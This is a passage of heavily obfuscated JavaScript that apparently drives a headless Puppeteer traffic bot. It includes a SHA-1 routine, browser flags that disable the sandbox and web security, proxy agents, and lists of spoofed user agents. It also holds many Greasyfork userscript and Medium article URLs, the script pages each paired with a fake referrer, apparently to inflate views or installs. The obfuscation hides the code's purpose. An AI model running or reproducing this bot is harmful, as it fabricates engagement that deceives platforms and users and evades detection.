          this['finalize']();
          var u = this['h0'],
            v = this['h1'],
            w = this['h2'],
            x = this['h3'],
            y = this['h4'];
          return f[u >> 0x4 * -0x4ac + 0x38c + 0x4 * 0x3d0 & 0x81a * 0x4 + 0xc1a + -0x2c73] + f[u >> 0x4b2 + 0xf51 + -0x13eb & 0x1 * -0x1831 + -0x10c8 + 0x2908] + f[u >> 0xae9 + -0x6 * -0x662 + -0x3121 & 0x8ad + 0x249a * 0x1 + 0x2d38 * -0x1] + f[u >> -0x9b * 0x1 + -0xd3b + 0xde6 & 0x1 * -0x13ca + -0x102b + 0x1 * 0x2404] + f[u >> 0x1 * -0x147 + 0xad4 + -0x981 & 0x179 * 0x1 + 0x1 * -0x83 + -0xe7] + f[u >> -0x1303 + 0x12f0 + 0x1b & -0x7 * -0x341 + -0xcf * -0x30 + -0x2 * 0x1ec4] + f[u >> 0x1824 + 0x1e98 + -0x36b8 & -0x1 * 0x732 + 0x1 * -0xd0e + -0x3 * -0x6c5] + f[0x1baf + 0xd98 + -0xa4e * 0x4 & u] + f[v >> 0x1 * 0x179f + -0x1d84 + -0x35 * -0x1d & -0x258f + 0x19 * 0x4b + 0xa5 * 0x2f] + f[v >> -0xe6f + 0x1 * 0x24be + -0x1637 & -0x1c3 * 0xe + 0x2 * 0xb6b + -0x1 * -0x1e3] + f[v >> -0x20c6 + -0x1 * -0xaf + 0x202b & -0x1 * -0x2043 + 0x2e7 * 0xa + 0x11 * -0x39a] + f[v >> 0x4 * -0x7f3 + 0x51d + 0x1abf & 0x2 * -0x1198 + -0x4 * 0x91 + 0x2583] + f[v >> -0x1 * 0xf13 + 0x638 + 0x2b * 0x35 & -0x5 * -0x62b + 0x1251 * -0x1 + -0xc77 * 0x1] + f[v >> -0xde5 + -0x6a4 * -0x2 + -0x37 * -0x3 & 0x25bb * 0x1 + -0x1 * -0x23b7 + -0x4963 * 0x1] + f[v >> 0x8b6 + -0x1502 + 0xc5 * 0x10 & -0x1 * 0x2501 + -0x2665 * 0x1 + -0x4b75 * -0x1] + f[0x16d1 + -0xd08 + 0x1f2 * -0x5 & v] + f[w >> -0x62a + -0x3 * 0x6e1 + -0x1 * -0x1ae9 & -0x1eb2 + 0x10e + 0x1db3] + f[w >> -0x1 * -0x5bd + 0x30 * -0x8d + 0x14cb & -0x756 + -0x49 * 0x77 + 0x2 * 0x14aa] + f[w >> -0x1 * -0x1873 + -0xd3e + -0x7 * 0x197 & 0xe2e + 0x10d * -0x1 + 0x1de * -0x7] + f[w >> -0x43 * -0x11 + 0x14c5 + -0x8 * 0x325 & 0x1 * 0x733 + -0xc3 + -0x1 * 0x661] + f[w >> -0x6c5 * -0x2 + -0xd7f + 0x1 & 0x15a * 0xc + 0x116c + 0x1 * -0x2195] + f[w >> -0x22bd + 0x61e + 0x1ca7 & 0x2 * 0x958 + -0xb * -0x313 + -0x3472] + f[w >> 0x21d1 * -0x1 + 0xc73 * -0x2 + 0x3abb & 0x1 * -0x10e5 + -0x57f + 0x1673] + f[0x16c3 + -0x5 * 0x107 + 0x5db * -0x3 & w] + f[x >> 0x4 * -0x51 + 0x996 + 0x1 * -0x836 & -0x254e + -0x1 * -0xd5e + 0x17ff] + f[x >> 0x1f1a * -0x1 + 0x167a + 0xba * 0xc & 0x18e7 + -0x82a + -0xa * 0x1ab] + f[x >> 0x7f2 * 0x1 + -0x1b * -0x56 + -0x10f0 & 0x96b * 0x1 + 0x4 * 0x58f + -0x6 * 0x544] + f[x >> 0x2412 + -0x1 * 0x4c3 + -0x1f3f & 0x2 * 0x251 + -0xacf * 0x3 + 0x1bda] + f[x >> 0x16f * 0x1a + 0x80a + -0x2d44 & 0x27e + -0xbb5 + 0x2 * 0x4a3] + f[x >> 0x144f + -0x112c + -0x31b & -0x8c8 * 0x4 + 0x937 + 0x19f8] + f[x >> 0x1916 + 0x2 * 0xe3d + -0x17 * 0x254 & -0x1f23 + -0x6e * 0x3c + -0x4e * -0xbb] + f[0x166c + -0x1ae3 * 0x1 + 0x486 & x] + f[y >> 0x337 + 0x1 * 0xabd + -0xdd8 & 0x2f * -0x97 + -0x21b * 0x12 + -0xe * -0x4b1] + f[y >> 0x235d + 0x1ab3 + -0x3df8 & 0x1a42 + -0xacc + -0xf67] + f[y >> 0x2 * -0xb95 + -0x247b + 0x3bb9 & 0x8e9 + -0x250c + 0x1c32] + f[y >> 0x25ba + 0x98c + -0x2f36 & 0x1be8 + 0x73b * 0x3 + -0x318a] + f[y >> -0x77f + 0x5a3 * -0x1 + 0xd2e & -0x197 + 0xb21 + -0x97b * 0x1] + f[y >> 0x1b18 * 0x1 + -0x2240 + 0x730 & -0x2 * 0x1147 + -0x9be * 0x2 + 0x3619] + f[y >> -0x97 * 0x11 + 0x119a + -0x78f & -0x27 * 0x7b + -0xf64 + 0x2230] + f[-0x35b * -0x7 + -0x4f6 * 0x7 + 0x6 * 0x1e2 & y];
        }
        ['digest']() {
          this['finalize']();
          var u = this['h0'],
            v = this['h1'],
            w = this['h2'],
            x = this['h3'],
            y = this['h4'];
          return [
            u >> -0xe11 * 0x1 + -0x10c3 + -0x7bb * -0x4 & 0x1bb0 + -0x1 * 0xb5 + -0x19fc,
            u >> -0x1e52 + -0x123 * 0x10 + 0x3092 & 0x243a * 0x1 + -0x1173 * 0x1 + -0x11c8,
            u >> -0x108d + -0x59 * -0x53 + -0xc46 & 0x3 * 0xc7b + -0x8f3 * 0x2 + -0x128c, -0x1fd1 * -0x1 + -0x15e3 * 0x1 + -0x8ef & u,
            v >> 0x1791 * 0x1 + 0x1 * 0x1100 + -0x2879 & -0xd8b * 0x2 + -0x33 * -0xa3 + -0x464,
            v >> -0x15 * -0xd5 + 0x45 * 0x7d + -0x1a6 * 0x1f & -0xef5 * 0x1 + 0x22 * -0x38 + -0x1f3 * -0xc,
            v >> 0x1119 + 0x3 * 0x3d1 + -0x14 * 0x16d & 0x125f + 0x10f8 + 0x44b * -0x8,
            0xea4 * 0x2 + -0xae1 + -0x4 * 0x45a & v,
            w >> 0x153b + 0x1364 + -0x2887 & -0x5f1 + -0x2258 + 0x2948,
            w >> 0x1 * 0x14de + -0x1d3 * -0x2 + 0x1 * -0x1874 & 0x85c + 0x19ad + -0x210a,
            w >> 0x1af7 + 0x26b7 + -0x1 * 0x41a6 & 0x1f9c + 0x1a5f * -0x1 + -0x43e,
            0x35b * -0x7 + -0x1 * -0x22fe + -0xa82 & w,
            x >> -0x1d6d + -0x1c74 + -0x123 * -0x33 & 0xad6 + -0x559 * -0x5 + -0x2 * 0x124a,
            x >> 0x9c6 * 0x2 + 0x259 * -0x1 + -0x1123 & -0x1849 + 0x147f + 0x7 * 0xaf,
            x >> 0x25e + 0x2 * -0x1084 + 0x1eb2 & -0x1d3f + -0x377 * 0x5 + -0x7b * -0x63,
            0x121d + -0x1 * -0x1b8 + -0x1 * 0x12d6 & x,
            y >> -0x1ebc + 0x214b + 0x1 * -0x277 & -0xee4 + 0x25 * 0x3d + 0x712,
            y >> 0x772 + -0x63b * -0x5 + 0x2689 * -0x1 & -0x1124 + -0x26d8 + 0x38fb * 0x1,
            y >> -0x146 + -0x2a5 * 0x4 + 0xea * 0xd & -0xf * -0xc7 + -0x25f3 + 0x1b49 * 0x1, -0x22ad + 0xe7d * 0x2 + 0x359 * 0x2 & y
          ];
        }
        ['arrayBuffe' + 'r']() {
          var r, s;
          return this['finalize'](), r = new ArrayBuffer(0x25f * -0xc + -0x1 * 0x1be8 + -0x3870 * -0x1), (s = new DataView(r))['setUint32'](0x265b * -0x1 + -0x13c5 * -0x1 + -0xd * -0x16e, this['h0']), s['setUint32'](0x23f8 + -0x1c9b + -0x21 * 0x39, this['h1']), s['setUint32'](0x1 * -0x1fc + 0x9 * 0x419 + -0x22dd, this['h2']), s['setUint32'](0x15 * 0x6b + 0x182b * 0x1 + -0x20e6, this['h3']), s['setUint32'](0x7ed + 0x54a * -0x4 + 0xd4b, this['h4']), r;
        }
    }
    p['prototype']['toString'] = p['prototype']['hex'], p['prototype']['array'] = p['prototype']['digest'];
    const q = l();
    return q;
  })()),
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil,
    min: min
  } = Math,
  NETWORK_PATIENCE = -0xdd5 + 0x4f * -0x45 + -0x20 * -0x290 + (-0x1 * -0x117 + -0x1d96 + -0x2837 * -0x1) * random(),
  MM_NETWORK_PATIENCE = (0x2681 + 0x16e6 + -0x3d64) * NETWORK_PATIENCE,
  me = random()['toString'](-0xf9 * 0x9 + 0x1b5 * 0xf + -0x10ca)['substring'](-0x6 * -0x5d5 + -0x2576 + 0x27c, 0x4d5 * -0x7 + -0x3 * -0x256 + 0x1adb),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  {
    HttpsProxyAgent: HttpsProxyAgent
  } = require(O(0x15) + 'y-agent'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + P(0x13, '06yK') + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + Q(0x3) + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + P(0xe, '06yK') + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + O(0x8) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + O(0x1) + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + Q(0xd) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
